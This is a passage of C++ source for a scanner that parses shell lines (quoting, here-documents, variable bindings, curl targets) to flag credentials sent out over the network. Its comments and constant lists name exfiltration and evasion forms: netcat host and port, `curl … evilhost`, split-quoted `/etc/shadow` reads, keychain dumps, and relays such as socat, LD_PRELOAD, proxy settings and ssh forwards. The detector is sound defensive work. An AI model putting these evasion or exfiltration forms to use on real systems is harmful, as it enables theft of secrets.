            redirectOut = prevBareWord = false;
            prevToken   = token;
            return;
        }
        const bool       commandPosition = expectCommand && !redirectIn;
        const bool       wasCommand      = commandPosition && !prefixWord( token, low );
        std::string_view operand         = flowReadOperand( low, prevToken, redirectIn );
        if( operand.empty() && segReader && !wasCommand && !low.starts_with( '-' ) )
        {
            operand = low;   // a reader's argument: `base64 -w0 FILE`, `cat -- FILE`, `tar cz FILE`
        }
        if( !operand.empty() )
        {
            noteRead( operand );
        }
        segSensitive = segSensitive || std::find( std::begin( kKeychainDumps ), std::end( kKeychainDumps ), low ) != std::end( kKeychainDumps );
        const bool digits    = isAllDigits( low );
        const bool netcatHop = segNetcat && prevBareWord && digits && low.size() <= 5;                        // netcat's `HOST PORT`
        const bool bareHost  = segCurlWget && !wasCommand && !low.empty() && namesplit::isIdentChar( low[0] );   // `curl … evilhost`
        segDest = segDest || ( segNet && !redirectIn && ( isDestinationToken( low ) || netcatHop || bareHost ) );
        if( wasCommand )
        {
            noteCommand( low );
        }
        prevBareWord = !wasCommand && !redirectIn && !digits && !low.starts_with( '-' );
        redirectIn   = false;
        prevToken    = token;
    }
};

// The state a shell word's first piece meets (WordStart).
inline WordStart wordStartOf( const NetFlowScan& scan ) noexcept
{
    return { scan.prevToken, scan.redirectIn, scan.expectCommand && !scan.redirectIn, scan.skipValue, scan.activePrefix };
}

// A shell word that quotes or backslashes split (`/etc/"passwd"`, `@"/etc/shadow"`, `< /etc/"passwd"`, `\cat`,
// `c"url"`), read WHOLE once its last piece is done: `whole` is lowered with its quotes and backslashes dropped.
// word() still classified every piece, so this only adds: a read operand, and in command position the command it
// names (`\cat` is cat; `\sudo curl` leaves curl the command). Called once per word, so a word of k pieces costs
// its length, never k times it.
inline void wholeWord( NetFlowScan& scan, std::string_view whole, std::string_view raw, const WordStart& at ) noexcept
{
    if( at.commandPosition )
    {   // re-judge the whole word from the state its first piece met: a value stays a value, a flag stays a flag
        scan.expectCommand = true;
        scan.skipValue     = at.skipValue;
        scan.activePrefix  = at.activePrefix;
        if( scan.prefixWord( raw, whole ) )
        {
            scan.expectCommand = true;
        }
        else
        {
            scan.noteCommand( whole );
        }
        return;
    }
    std::string_view operand = flowReadOperand( whole, at.prev, at.redirectIn );
    if( operand.empty() && scan.segReader && !whole.starts_with( '-' ) )
    {
        operand = whole;
    }
    if( !operand.empty() )
    {
        scan.noteRead( operand );
    }
}

// The shell word a piece belongs to: pieces separated only by quotes (`/etc/"passwd"`, `"/etc/"'shadow'`) are one word,
// and backslash escapes drop (`/etc/pass\wd`, `\cat`). Each piece is appended once and the word is handed back once,
// when it ends, so the cost is linear in the line however many pieces a hostile word is cut into.
struct ShellWordJoin
{
    std::string whole;
    std::string raw[2];          // the word as written (case kept, quotes and escapes dropped); two buffers, so the
    int         cur   = 0;       // finished word stays the scan's prevToken while the next word is assembled
    bool        split = false;   // more than one piece, or an escape: the whole word differs from its pieces

    void add( std::string_view piece, std::string_view rawPiece )
    {
        const auto unescaped = []( char ch ) noexcept { return ch != '\\'; };
        split = split || !whole.empty() || piece.find( '\\' ) != std::string_view::npos;
        std::copy_if( piece.begin(), piece.end(), std::back_inserter( whole ), unescaped );
        std::copy_if( rawPiece.begin(), rawPiece.end(), std::back_inserter( raw[cur] ), unescaped );
    }
    // The word is done: the next one is assembled in the other buffer, so this one's spelling stays readable.
    void finish()
    {
        cur ^= 1;
        raw[cur].clear();
        whole.clear();
        split = false;
    }
    // Does the word go on past `end`: one or more quotes, then a byte that starts another piece?
    static bool continuesAt( std::string_view line, std::size_t end, std::string_view separators ) noexcept
    {
        const std::size_t q = std::min( line.find_first_not_of( "\"'", end ), line.size() );
        return q > end && q < line.size() && separators.find( line[q] ) == std::string_view::npos;
    }
};

inline NetFlow netFlow( std::string_view line, std::string_view lowered ) noexcept
{
    constexpr std::string_view kFlowSeparators = " \t\"'`|;&()<>\r\n";
    NetFlowScan            scan;
    ShellWordJoin          join;
    WordStart              at{};
    for( std::size_t i = 0; i < line.size(); )
    {
        if( const std::size_t consumed = scan.punctuation( line, i ); consumed > 0 )
        {
            i += consumed;
            continue;
        }
        const std::size_t end = std::min( line.find_first_of( kFlowSeparators, i ), line.size() );
        if( join.whole.empty() && !join.split )
        {
            at = wordStartOf( scan );
        }
        join.add( lowered.substr( i, end - i ), line.substr( i, end - i ) );
        scan.word( line.substr( i, end - i ), lowered.substr( i, end - i ) );
        if( !ShellWordJoin::continuesAt( line, end, kFlowSeparators ) )
        {
            if( join.split )
            {
                wholeWord( scan, join.whole, join.raw[join.cur], at );
                scan.prevToken = join.raw[join.cur];   // `--upload-""file FILE`: the option as written precedes FILE
            }
            join.finish();
        }
        i = end;
    }
    scan.endSegment( false );
    return scan.flow;
}

// ── #353 flow: what a `$VAR` holds, where a curl line sends, and whose credential it carries ─────────────────────────
// gradeNetExfil reads one line, so `BASE_URL=https://api.cloudflare.com/…` three lines up was invisible: a token on its
// way to its own service and a token on its way out read alike, both CRITICAL. The idea is NVIDIA SkillSpector's taint
// tracking (follow a value through an intermediate variable; keep the finding whenever an operand, a flag or a command
// lies outside what the proof models); none of its code is used.
//   resolution   `$VAR` / `${VAR}` stands for a literal when the document binds VAR at exactly ONE site, that site is a
//                plain assignment that always runs (`VAR=…`, `export VAR=…`; ShellBlockState) or a `for VAR in` list of
//                literal words, and it comes before the use (ShellBindings). Any other binding form is a site too, and leaves the variable unresolved; a
//                document that binds names the table cannot read (`source`, `eval`, `declare`, `printf -v`, a dynamic
//                `export`, `${!ref}`) resolves nothing.
//   destination  the hosts the line's curl commands send to, when every one is proved (curlLineHosts); dest= names them.
//   owner        the credential variable's name names the owner of every host (kCredentialOwners); owner= says so. It is
//                INFORMATION, never a downgrade: an adversarial review (round 2) showed a token sent to its own service's
//                API still moves data to an object the attacker controls there (a gist, an issue body, an ssh key, a member
//                invite), and the line can be redirected away from what it says (proxy env, curlrc, a shadowed curl).
// A credential variable sent only to a canonical loopback or RFC 1918 host is WARN why="local-dest", and only when the
// document shows no relay, forward or redirect (ShellDocSignals: a HEURISTIC, not a proof). Everything else that
// carried a credential stays CRITICAL.
inline constexpr const char* kNetExfilLocalWhy = "local-dest";

// One shell word: quotes removed and backslash escapes resolved (case kept), and where its first byte sits in the line.
// The text no longer says which `$` the shell expands, so the cut records it: a single-quoted or escaped `$` stays a
// literal byte, and an unquoted expansion is word-split and globbed (its value can add arguments).
struct ShellWord
{
    std::string text;
    std::size_t begin          = 0;
    bool        literalDollar  = false;   // a `$` the shell does not expand: single-quoted (`'$X'`) or escaped (`\$X`)
    bool        unquotedDollar = false;   // a `$` expansion outside quotes (`-d $BODY`)
};

// Does the unquoted `$` at text[at] start an expansion (`$NAME`, `${`, `$1`, `$@`, …)? A lone `$`, `$/` or `$'` does not.
inline bool shellExpansionAt( std::string_view text, std::size_t at ) noexcept
{
    const char next = at + 1 < text.size() ? text[ at + 1 ] : '\0';
    return next == '{' || namesplit::isIdentChar( next ) || std::string_view( "@*#?$!-" ).find( next ) != std::string_view::npos;
}

// A here-document a line opens: its body runs from the next line to the delimiter line (`<<-` strips leading tabs).
struct ShellHeredoc
{
    std::string delimiter;
    bool        stripTabs = false;
};

// What joins a simple command to its neighbour. Nested marks the edge of a `(`, `$(`, backtick or `<(` context.
enum class ShellJoin : char { LineEnd, Sequence, And, Or, Pipe, Background, Nested };

struct ShellCommand
{
    std::vector<ShellWord> words;
    ShellJoin              lead  = ShellJoin::LineEnd;   // before it (LineEnd = the line starts here)
    ShellJoin              trail = ShellJoin::LineEnd;   // after it (LineEnd = the line ends here)
};

// A line cut into simple commands. modelled=false when the cut is not the whole story: a command substitution, a
// subshell or process substitution, an unterminated quote, or a trailing `\` that continues the command on the next line.
struct ShellLine
{
    std::vector<ShellCommand> commands;
    std::vector<ShellHeredoc> heredocs;                              // the here-documents the line opens, in order
    std::size_t               commentAt  = std::string_view::npos;   // where a `#` comment starts
    int                       parenDepth = 0;                        // unquoted `(` / `$(` opened minus `)` closed
    bool                      modelled   = true;
    bool                      openQuote  = false;   // the line ends inside a quote: the next line continues it
    bool                      continues  = false;   // the line ends in `\`, `&&`, `||` or `|`: the next line continues it
};

// cutShellLine's state. Quotes are joined into the word they sit in (`"https://a"@b` is ONE word, as the shell passes
// it), a redirect's target is dropped (a here-document's delimiter is kept in cut.heredocs), and a `#` that starts a
// word ends the line.
struct ShellCutter
{
    ShellLine    cut;
    ShellCommand command;
    std::string  word;
    std::size_t  wordBegin      = 0;
    bool         inWord         = false;
    bool         dropNextWord   = false;   // the word after a redirect operator is its target, not an argument
    bool         heredocPending = false;   // that target is a here-document delimiter
    bool         heredocTabs    = false;
    bool         literalDollar  = false;   // the word's ShellWord flags, so far
    bool         unquotedDollar = false;

    void startWord( std::size_t at ) noexcept
    {
        if( !inWord )
        {
            inWord    = true;
            wordBegin = at;
        }
    }
    void endWord()
    {
        if( inWord && dropNextWord && heredocPending )
        {
            cut.heredocs.push_back( { word, heredocTabs } );
            heredocPending = false;
        }
        if( inWord && !dropNextWord )
        {
            command.words.push_back( { std::move( word ), wordBegin, literalDollar, unquotedDollar } );
        }
        dropNextWord = dropNextWord && !inWord;
        word.clear();
        inWord         = false;
        literalDollar  = false;
        unquotedDollar = false;
    }
    void endCommand( ShellJoin join )
    {
        endWord();
        dropNextWord   = false;
        heredocPending = false;
        if( !command.words.empty() )
        {
            command.trail = join;
            cut.commands.push_back( std::move( command ) );
        }
        command      = ShellCommand{};
        command.lead = join;
    }
    // A redirect operator at line[i]: an fd number written against it (`2>`) is not a word, and its target is dropped.
    std::size_t redirect( std::string_view line, std::size_t i )
    {
        if( inWord && !word.empty() && isAllDigits( word ) )
        {
            word.clear();
            inWord = false;
        }
        endWord();
        dropNextWord = true;
        if( const std::string_view rest = line.substr( i ); rest.starts_with( "<<" ) && !rest.starts_with( "<<<" ) )
        {
            heredocPending = true;
            heredocTabs    = rest.size() > 2 && rest[2] == '-';
            return heredocTabs ? 3 : 2;
        }
        std::size_t n = 1;
        while( i + n < line.size() && n < 3 && ( line[ i + n ] == '<' || line[ i + n ] == '>' || line[ i + n ] == '&' || line[ i + n ] == '|' ) )
        {
            ++n;
        }
        return n;
    }
    // `&`, `<`, `>` and `$(` at line[i]: a join, a redirect, a nested context, or 0 for an ordinary word byte.
    std::size_t ampersandOrAngleAt( std::string_view line, std::size_t i )
    {
        const char c    = line[i];
        const char next = i + 1 < line.size() ? line[ i + 1 ] : '\0';
        if( c == '&' && next != '>' )
        {
            endCommand( next == '&' ? ShellJoin::And : ShellJoin::Background );
            return next == '&' ? 2 : 1;
        }
        if( ( ( c == '<' || c == '>' ) && next == '(' ) || ( c == '$' && next == '(' ) )
        {
            cut.modelled = false;
            ++cut.parenDepth;
            endCommand( ShellJoin::Nested );
            return 2;
        }
        return ( c == '<' || c == '>' || c == '&' ) ? redirect( line, i ) : 0;
    }
    // The bytes an unquoted separator, quote or join at line[i] consumes, or 0 for an ordinary word byte.
    std::size_t operatorAt( std::string_view line, std::size_t i, char& quote )
    {
        const char c    = line[i];
        const char next = i + 1 < line.size() ? line[ i + 1 ] : '\0';
        switch( c )
        {
            case ' ': case '\t': case '\r': endWord(); return 1;
            case '\'': case '"': startWord( i ); quote = c; return 1;
            case ';': endCommand( ShellJoin::Sequence ); return 1;
            case '|': endCommand( next == '|' ? ShellJoin::Or : ShellJoin::Pipe ); return ( next == '|' || next == '&' ) ? 2 : 1;
            case '(': case ')': case '`':
                cut.modelled = false;
                cut.parenDepth += c == '(' ? 1 : ( c == ')' ? -1 : 0 );
                endCommand( ShellJoin::Nested );
                return 1;
            default: return ampersandOrAngleAt( line, i );
        }
    }
    // Inside a quote: the bytes line[i] consumes. A `$(` or backtick in double quotes still runs a command.
    std::size_t quotedAt( std::string_view line, std::size_t i, char& quote )
    {
        const char c = line[i];
        if( c == quote )
        {
            quote = 0;
            return 1;
        }
        if( quote == '"' && c == '\\' && i + 1 < line.size() && std::string_view( "$`\"\\" ).find( line[ i + 1 ] ) != std::string_view::npos )
        {
            literalDollar = literalDollar || line[ i + 1 ] == '$';
            word += line[ i + 1 ];
            return 2;
        }
        literalDollar = literalDollar || ( quote == '\'' && c == '$' );
        cut.modelled = cut.modelled && !( quote == '"' && ( c == '`' || ( c == '$' && i + 1 < line.size() && line[ i + 1 ] == '(' ) ) );
        word += c;
        return 1;
    }
    // An unquoted `\` at line[i]: the next byte joins the word as a literal; a trailing `\` continues the command.
    std::size_t escapeAt( std::string_view line, std::size_t i )
    {
        cut.modelled  = cut.modelled && i + 1 < line.size();
        cut.continues = cut.continues || i + 1 >= line.size();
        if( i + 1 < line.size() )
        {
            startWord( i );
            literalDollar = literalDollar || line[ i + 1 ] == '$';
            word += line[ i + 1 ];
        }
        return 2;
    }
    // An ordinary unquoted byte: it joins the word, and an unquoted `$NAME` marks an expansion the shell will split.
    void wordByte( std::string_view line, std::size_t i )
    {
        startWord( i );
        unquotedDollar = unquotedDollar || ( line[i] == '$' && shellExpansionAt( line, i ) );
        word += line[i];
    }
    // The line is cut: does it end inside a quote, or on `\`, `&&`, `||` or `|` that carries the command onto the next?
    ShellLine finish( char quote )
    {
        const auto listJoin = []( ShellJoin j ) noexcept { return j == ShellJoin::And || j == ShellJoin::Or || j == ShellJoin::Pipe; };
        const bool openList = !inWord && command.words.empty() && !cut.commands.empty() && listJoin( cut.commands.back().trail );
        cut.modelled  = cut.modelled && quote == 0;
        cut.openQuote = quote != 0;
        cut.continues = cut.continues || openList;
        endCommand( ShellJoin::LineEnd );
        return std::move( cut );
    }
};

inline ShellLine cutShellLine( std::string_view line )
{
    ShellCutter cutter;
    char        quote = 0;
    for( std::size_t i = 0; i < line.size(); )
    {
        if( quote != 0 )
        {
            i += cutter.quotedAt( line, i, quote );
            continue;
        }
        if( line[i] == '#' && !cutter.inWord )
        {
            cutter.cut.commentAt = i;   // a comment runs to the end of the line
            break;
        }
        if( line[i] == '\\' )
        {
            i += cutter.escapeAt( line, i );
            continue;
        }
        const std::size_t consumed = cutter.operatorAt( line, i, quote );
        if( consumed == 0 )
        {
            cutter.wordByte( line, i );
        }
        i += std::max<std::size_t>( consumed, 1 );
    }
    return cutter.finish( quote );
}

inline bool isShellIdent( std::string_view s ) noexcept
{
    return !s.empty() && namesplit::isIdentStart( s[0] ) && std::all_of( s.begin(), s.end(), []( char c ) noexcept { return namesplit::isIdentChar( c ); } );
}

// The NAME of a `NAME=value` word, or empty.
inline std::string_view assignedName( std::string_view word ) noexcept
{
    const std::size_t eq = word.find( '=' );
    return ( eq != std::string_view::npos && isShellIdent( word.substr( 0, eq ) ) ) ? word.substr( 0, eq ) : std::string_view{};
}

// One place the document binds a variable. Only a literal site carries values: the one value of a plain assignment, or
// the words of a `for NAME in …` list.
struct ShellBindingSite
{
    std::string              name;
    int                      line = 0;
    std::size_t              col  = 0;
    bool                     literal = false;
    std::vector<std::string> values;
};

// What a document does that the per-line proof cannot see. A HEURISTIC, not a proof: a short, tested list of the
// shell forms that rebind a name behind the site table's back, or that can carry a request past the host its line
// names. Each only ever withholds resolution or the local-dest WARN; none raises or lowers a severity by itself.
struct ShellDocSignals
{
    bool rebinds = false;   // `source` / `.`, `eval`, `declare` / `typeset`, `printf -v`, `export` of a computed name, `${!ref}`
    bool relays  = false;   // a relay, forward, redirect, proxy, curl config or shadowed curl anywhere in the document
};

// Every binding site in one document, sorted by name and then position.
struct ShellBindings
{
    std::vector<ShellBindingSite> sites;
    ShellDocSignals               signals;

    // The ONE literal site binding `name` before (line, col), or null: no site, two or more sites, a site that binds
    // from a command, a variable or a read, a site at or after the use, or a document that rebinds names unseen.
    const ShellBindingSite* resolve( std::string_view name, int line, std::size_t col ) const noexcept
    {
        if( signals.rebinds )
        {
            return nullptr;
        }
        const auto byName = []( const ShellBindingSite& s, std::string_view n ) noexcept { return rw::sortutil::svLess( s.name, n ); };
        const auto first  = std::lower_bound( sites.begin(), sites.end(), name, byName );
        if( first == sites.end() || first->name != name || ( first + 1 != sites.end() && ( first + 1 )->name == name ) )
        {
            return nullptr;
        }
        const bool before = first->line < line || ( first->line == line && first->col < col );
        return ( first->literal && before ) ? &*first : nullptr;
    }
};

// Commands whose later identifier words a run may (re)bind: `read URL`, `unset URL`, `local URL`, `getopts o URL`.
inline constexpr std::string_view kShellBindingCommands = "read readarray mapfile getopts unset local declare typeset";
// Words that leave the next word in command position for a plain assignment or a `for` (`then URL=…`, `do for …`).
inline constexpr std::string_view kShellLeadWords = "then do else elif if while until ! { $";

// Every `NAME=`, `NAME+=`, `NAME:=` (`${NAME:=x}`) and `NAME[` (an array element) on the line, wherever it sits — in a
// quote, a URL query or prose too: a site the proof cannot read only makes the variable unresolved. Each starts
// non-literal; noteLiteralAssignment upgrades the plain assignments.
inline void noteAssignmentSites( std::string_view ln, int lineNum, std::vector<ShellBindingSite>& sites )
{
    for( std::size_t i = 0; i < ln.size(); )
    {
        if( !namesplit::isIdentStart( ln[i] ) || ( i > 0 && ( namesplit::isIdentChar( ln[ i - 1 ] ) || ln[ i - 1 ] == '$' ) ) )
        {
            ++i;
            continue;
        }
        std::size_t end = i;
        while( end < ln.size() && namesplit::isIdentChar( ln[end] ) )
        {
            ++end;
        }
        const char after = end < ln.size() ? ln[end] : '\0';
        const bool binds = after == '=' || after == '[' || ( ( after == '+' || after == ':' ) && end + 1 < ln.size() && ln[ end + 1 ] == '=' );
        if( binds )
        {
            sites.push_back( { std::string( ln.substr( i, end - i ) ), lineNum, i, false, {} } );
        }
        i = end;
    }
}

// The first word of a command that is not a lead word (`then`, `do`, a `$ ` prompt, …).
inline std::size_t firstCommandWord( const std::vector<ShellWord>& w ) noexcept
{
    std::size_t k = 0;
    while( k < w.size() && namesplit::hasField( kShellLeadWords, " ", w[k].text, /*visitTrailingEmpty=*/false ) )
    {
        ++k;
    }
    return k;
}

// `for NAME in w…` / `select NAME in w…` at word k: a site, literal when the line is modelled and no word expands (no
// `$`, backtick, glob or brace), its values the words. False when word k starts no such loop.
inline bool noteLoopSite( const std::vector<ShellWord>& w, std::size_t k, bool modelled, int lineNum, std::vector<ShellBindingSite>& sites )
{
    if( k + 1 >= w.size() || ( w[k].text != "for" && w[k].text != "select" ) || !isShellIdent( w[ k + 1 ].text ) )
    {
        return false;
    }
    const auto expands = []( const ShellWord& x ) noexcept { return x.text.find_first_of( "$`*?[{" ) != std::string::npos; };
    ShellBindingSite site{ w[ k + 1 ].text, lineNum, w[ k + 1 ].begin, false, {} };
    site.literal = modelled && k + 3 < w.size() && w[ k + 2 ].text == "in" && std::none_of( w.begin() + std::ptrdiff_t( k + 3 ), w.end(), expands );
    for( std::size_t v = k + 3; site.literal && v < w.size(); ++v )
    {
        site.values.push_back( w[v].text );
    }
    sites.push_back( std::move( site ) );
    return true;
}

// The identifier words a binding command (`read`, `unset`, `local`, …) or `printf -v` may set: never literal.
inline void noteBindingWordSites( const std::vector<ShellWord>& w, std::size_t k, int lineNum, std::vector<ShellBindingSite>& sites )
{
    const bool bindsWords = k < w.size() && namesplit::hasField( kShellBindingCommands, " ", w[k].text, false );
    const bool printfV    = k < w.size() && w[k].text == "printf";
    for( std::size_t v = k + 1; v < w.size(); ++v )
    {
        if( isShellIdent( w[v].text ) && ( bindsWords || ( printfV && w[ v - 1 ].text == "-v" ) ) )
        {
            sites.push_back( { w[v].text, lineNum, w[v].begin, false, {} } );
        }
    }
}

// `;`, `&&` or a line end: the joins after which a plain assignment has run in the current shell.
inline bool joinsInShell( ShellJoin join ) noexcept
{
    return join == ShellJoin::LineEnd || join == ShellJoin::Sequence || join == ShellJoin::And;
}

// The `NAME=` sites noteAssignmentSites appended for one line: [first, rawEnd) of the document's site list, in column
// order. The command-level sites of the same line come after rawEnd, so a search must stop there.
struct ShellLineSites
{
    std::size_t first  = 0;
    std::size_t rawEnd = 0;
};

// `[$ ][export|readonly [-flags]] NAME=value` standing alone, with nothing before it on its line but `;`, after
// nothing but `;`, `&&` or the line end, outside every compound command, in a fully modelled line (literalOk): the one
// assignment form whose value is known and that always runs. Behind `&&` / `||`, after `then` / `do` / `if`, or in an
// `if`/loop body it may not run, and the variable keeps whatever it held. It upgrades the site noteAssignmentSites
// found at the word's first byte (the NAME is unquoted, so it starts the word); that pass appended the line's sites
// in column order, so a binary search finds it and a line of 50,000 assignments stays linear.
inline void noteLiteralAssignment( const ShellCommand& cmd, std::size_t k, bool literalOk, std::vector<ShellBindingSite>& sites, ShellLineSites line )
{
    const std::vector<ShellWord>& w = cmd.words;
    std::size_t a = k + ( k < w.size() && ( w[k].text == "export" || w[k].text == "readonly" ) ? 1 : 0 );
    while( a < w.size() && a > k && w[a].text.starts_with( '-' ) )
    {
        ++a;
    }
    const std::string_view name   = a + 1 == w.size() ? assignedName( w[a].text ) : std::string_view{};
    const bool             prompt = std::all_of( w.begin(), w.begin() + std::ptrdiff_t( k ), []( const ShellWord& x ) noexcept { return x.text == "$"; } );
    const bool             runs   = ( cmd.lead == ShellJoin::LineEnd || cmd.lead == ShellJoin::Sequence ) && joinsInShell( cmd.trail );
    if( !literalOk || name.empty() || !prompt || !runs )
    {
        return;
    }
    const auto last = sites.begin() + std::ptrdiff_t( line.rawEnd );
    const auto site = std::lower_bound( sites.begin() + std::ptrdiff_t( line.first ), last, w[a].begin,
                                        []( const ShellBindingSite& x, std::size_t col ) noexcept { return x.col < col; } );
    if( site != last && site->col == w[a].begin && site->name == name )
    {
        site->literal = true;
        site->values  = { w[a].text.substr( name.size() + 1 ) };
    }
}

// The command-level binding sites of one cut command (the `NAME=` sites are noteAssignmentSites'). literalOk=false
// keeps every site it notes non-literal.
inline void noteCommandSites( const ShellCommand& cmd, bool literalOk, int lineNum, std::vector<ShellBindingSite>& sites, ShellLineSites line )
{
    const std::size_t k = firstCommandWord( cmd.words );
    if( noteLoopSite( cmd.words, k, literalOk, lineNum, sites ) )
    {
        return;
    }
    noteBindingWordSites( cmd.words, k, lineNum, sites );
    noteLiteralAssignment( cmd, k, literalOk, sites, line );
}

// How one command moves the compound-command depth: `if`, `while`, `until` or `{` before its command word, or a
// `for NAME in` / `for ((` / `select NAME in` / `case … in` header, opens one; `fi`, `done`, `esac` or `}` closes one.
inline int blockDepthDelta( const ShellCommand& cmd ) noexcept
{
    const std::vector<ShellWord>& w = cmd.words;
    const std::size_t             k = firstCommandWord( w );
    int delta = int( std::count_if( w.begin(), w.begin() + std::ptrdiff_t( k ), []( const ShellWord& x ) noexcept
                                    { return x.text == "if" || x.text == "while" || x.text == "until" || x.text == "{"; } ) );
    if( k >= w.size() )
    {
        return delta;
    }
    const std::string_view verb    = w[k].text;
    const bool             loopIn  = k + 2 < w.size() && isShellIdent( w[ k + 1 ].text ) && w[ k + 2 ].text == "in";
    const bool             arith   = k + 1 == w.size() && cmd.trail == ShellJoin::Nested;   // `for ((`
    const bool             caseIn  = k + 2 < w.size() && w.back().text == "in";
    const bool             opens   = ( ( verb == "for" || verb == "select" ) && ( loopIn || arith ) ) || ( verb == "case" && caseIn );
    const bool             closes  = verb == "fi" || verb == "done" || verb == "esac" || verb == "}";
    return delta + ( opens ? 1 : 0 ) - ( closes ? 1 : 0 );
}

// Where collectShellBindings stands between lines. A here-document body is data, never a binding the proof may read
// (its `NAME=` lines stay non-literal sites). An assignment inside a compound command or a `(…)` / `$(…)` that spans
// lines, or on a line a `\`, `&&`, `||`, `|` or an open quote continues, may not run in this shell. A markdown fence
// line restarts the depth, quote and continuation reading (each fenced block is read on its own); a here-document
// body runs on to its delimiter.
struct ShellBlockState
{
    std::vector<ShellHeredoc> heredocs;    // every here-document opened so far, in order
    std::size_t               heredocAt = 0;
    int                       depth     = 0;
    bool                      openQuote = false;
    bool                      continued = false;

    // True when `line` belongs to a pending here-document body (its delimiter line included).
    bool bodyLine( std::string_view line )
    {
        if( heredocAt >= heredocs.size() )
        {
            return false;
        }
        const ShellHeredoc& h    = heredocs[heredocAt];
        const std::size_t   from = h.stripTabs ? std::min( line.find_first_not_of( '\t' ), line.size() ) : 0;
        heredocAt += line.substr( from ) == h.delimiter ? 1 : 0;
        return true;
    }
    // Does an assignment on the next line start where every earlier line has finished (no open block, quote or list)?
    bool atTop() const noexcept { return depth == 0 && !openQuote && !continued; }
    void afterLine( const ShellLine& cut )
    {
        heredocs.insert( heredocs.end(), cut.heredocs.begin(), cut.heredocs.end() );
        depth     = std::max( 0, depth + cut.parenDepth );
        openQuote = openQuote != cut.openQuote;
        continued = cut.continues;
    }
    void fence() noexcept
    {
        depth     = 0;
        openQuote = false;
        continued = false;
    }
};

// Commands that bind names the site table cannot read, and listeners or relays (matched on the command's basename).
inline constexpr std::string_view kShellRebindCommands = "source . eval declare typeset";
inline constexpr std::string_view kShellRelayCommands  = "source . eval socat nc ncat netcat";
// Case-folded text anywhere in a document that relays, forwards, proxies, reconfigures or shadows curl.
inline constexpr std::string_view kShellRelayTexts[] = {
    "gopher://", "smtp://", "_proxy", ".curlrc", "_curlrc", "curl_home", "--config", "ld_preload", "ld_library_path", "dyld_",
    "curl()", "curl ()", "function curl", "alias curl", "http.server", "socketserver", "simplehttpserver",
    "localforward", "remoteforward", "dynamicforward", "proxycommand" };

// `export` / `readonly` whose operand is not a plain `NAME` or `NAME=value`: a computed name (`export ${P}SE=…`) rebinds
// unseen; a computed value (`$`, a backtick, a `$(` that left the line unmodelled) may point curl elsewhere.
inline ShellDocSignals exportSignals( const std::vector<ShellWord>& w, std::size_t k, bool modelled )
{
    ShellDocSignals out;
    if( k >= w.size() || ( w[k].text != "export" && w[k].text != "readonly" ) )
    {
        return out;
    }
    out.relays = !modelled;
    for( std::size_t a = k + 1; a < w.size(); ++a )
    {
        const std::string_view text = w[a].text;
        if( text.starts_with( '-' ) )
        {
            continue;
        }
        out.rebinds = out.rebinds || !isShellIdent( text.substr( 0, text.find( '=' ) ) );
        out.relays  = out.relays || out.rebinds || text.find_first_of( "$`" ) != std::string_view::npos;
    }
    return out;
}

// One cut command's signals: a rebinding or relay command, `printf -v`, an `ssh` forward (-L/-R/-D), a curl `-K` config,
// or a job left running in the background (a listener the line may be talking to).
inline ShellDocSignals commandSignals( const ShellCommand& cmd, bool modelled )
{
    const std::vector<ShellWord>& w    = cmd.words;
    const std::size_t             k    = firstCommandWord( w );
    const std::string_view        verb = k < w.size() ? namesplit::afterLast( w[k].text, "/" ) : std::string_view{};
    ShellDocSignals               out  = exportSignals( w, k, modelled );
    const auto shortFlag = [ & ]( std::string_view letters )
    {
        return std::any_of( w.begin(), w.end(), [ & ]( const ShellWord& x )
                            { return x.text.size() > 1 && x.text[0] == '-' && x.text[1] != '-' && x.text.find_first_of( letters ) != std::string::npos; } );
    };
    const bool printfV = verb == "printf" && shortFlag( "v" );
    const bool dotRead = verb == "." && modelled;   // in prose, `(…). A` cuts a `.` command; only a modelled line sources
    out.rebinds = out.rebinds || printfV || dotRead || ( verb != "." && namesplit::hasField( kShellRebindCommands, " ", verb, false ) );
    out.relays  = out.relays || out.rebinds || cmd.trail == ShellJoin::Background || ( verb != "." && namesplit::hasField( kShellRelayCommands, " ", verb, false ) )
               || ( verb == "ssh" && shortFlag( "LRD" ) ) || shortFlag( "K" );
    return out;
}

// `host:` as a header name (`Host: evil`, `X-Forwarded-Host:`), not the tail of `localhost:`; `PATH=` / `PATH+=` as an
// assignment, not `$PATH` or `MANPATH=`. Both on a case-folded line.
inline bool namesHostHeaderOrPath( std::string_view low ) noexcept
{
    const auto wordAt = [ & ]( std::size_t at ) noexcept { return at == 0 || !namesplit::isIdentChar( low[ at - 1 ] ); };
    for( std::size_t at = low.find( "host" ); at != std::string_view::npos; at = low.find( "host", at + 1 ) )
    {
        const std::size_t colon = low.find_first_not_of( ' ', at + 4 );
        if( wordAt( at ) && colon != std::string_view::npos && low[colon] == ':' )
        {
            return true;
        }
    }
    for( std::size_t at = low.find( "path" ); at != std::string_view::npos; at = low.find( "path", at + 1 ) )
    {
        const std::string_view rest = low.substr( at + 4 );
        if( wordAt( at ) && ( at == 0 || low[ at - 1 ] != '$' ) && ( rest.starts_with( '=' ) || rest.starts_with( "+=" ) ) )
        {
            return true;
        }
    }
    return false;
}

inline bool lineRelayText( std::string_view line )
{
    std::string low( line );
    std::transform( low.begin(), low.end(), low.begin(), []( char c ) noexcept { return char( std::tolower( static_cast<unsigned char>( c ) ) ); } );
    return namesHostHeaderOrPath( low )
        || std::any_of( std::begin( kShellRelayTexts ), std::end( kShellRelayTexts ), [ & ]( std::string_view t ) noexcept { return low.find( t ) != std::string::npos; } );
}

// One cut line's commands: their binding sites (literal only at the top level of a modelled line outside a here-document
// body), the block depth they open or close, and their document signals.
inline void noteLineCommands( const ShellLine& cut, bool body, int lineNum, ShellLineSites at, ShellBlockState& block, ShellBindings& bindings )
{
    const bool topLevel = cut.modelled && !body && block.atTop();
    for( const ShellCommand& cmd : cut.commands )
    {
        noteCommandSites( cmd, topLevel && block.depth == 0, lineNum, bindings.sites, at );
        block.depth = body ? block.depth : std::max( 0, block.depth + blockDepthDelta( cmd ) );
        const ShellDocSignals sig = commandSignals( cmd, cut.modelled );
        bindings.signals.rebinds  = bindings.signals.rebinds || sig.rebinds;
        bindings.signals.relays   = bindings.signals.relays || sig.relays;
    }
}

inline ShellBindings collectShellBindings( const std::vector<std::string>& lines )
{
    ShellBindings   bindings;
    ShellBlockState block;
    for( std::size_t i = 0; i < lines.size(); ++i )
    {
        const int      lineNum = int( i ) + 1;
        const bool     body    = block.bodyLine( lines[i] );
        ShellLineSites at{ bindings.sites.size(), 0 };
        noteAssignmentSites( lines[i], lineNum, bindings.sites );
        at.rawEnd = bindings.sites.size();
        if( !body && lines[i].starts_with( "```" ) )
        {
            block.fence();
        }
        const ShellLine cut = cutShellLine( lines[i] );
